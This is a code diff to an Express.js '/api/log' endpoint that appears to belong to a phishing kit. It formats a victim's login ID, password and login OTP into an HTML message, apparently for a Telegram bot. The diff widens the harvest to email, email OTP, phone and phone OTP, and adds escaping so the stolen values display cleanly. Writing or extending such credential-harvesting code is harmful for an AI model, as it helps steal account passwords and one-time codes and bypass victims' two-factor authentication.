@@ -31,13 +31,19 @@ app.post('/api/log', async (req, res) => {
         return res.status(500).json({ success: false, error: 'Config missing' });
     }
 
+    const esc = (str) => String(str || 'N/A').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+
     const message = `
-🔥 <b>${title}</b>
+🔥 <b>${esc(title)}</b>
 ━━━━━━━━━━━━━━━
-👤 <b>Login ID</b>: <code>${data.id}</code>
-🔑 <b>Password</b>: <code>${data.pass || 'N/A'}</code>
-🔢 <b>Login OTP</b>: <code>${data.login_otp || 'N/A'}</code>
-🕒 <b>Time</b>: ${data.time}
+👤 <b>Login ID</b>: <code>${esc(data.id)}</code>
+🔑 <b>Password</b>: <code>${esc(data.pass)}</code>
+🔢 <b>Login OTP</b>: <code>${esc(data.login_otp)}</code>
+📧 <b>Email</b>: <code>${esc(data.email)}</code>
+🔢 <b>E-OTP</b>: <code>${esc(data.email_otp)}</code>
+📱 <b>Phone</b>: <code>${esc(data.phone)}</code>
+🔢 <b>P-OTP</b>: <code>${esc(data.phone_otp)}</code>
+🕒 <b>Time</b>: ${esc(data.time)}
 ━━━━━━━━━━━━━━━`;
 
     try {
@@ -54,6 +60,7 @@ app.post('/api/log', async (req, res) => {
         res.status(500).json({ success: false, error: errorDetail });
     }
 });
+
 
 // STATIC FILES
 app.use(express.static(__dirname));
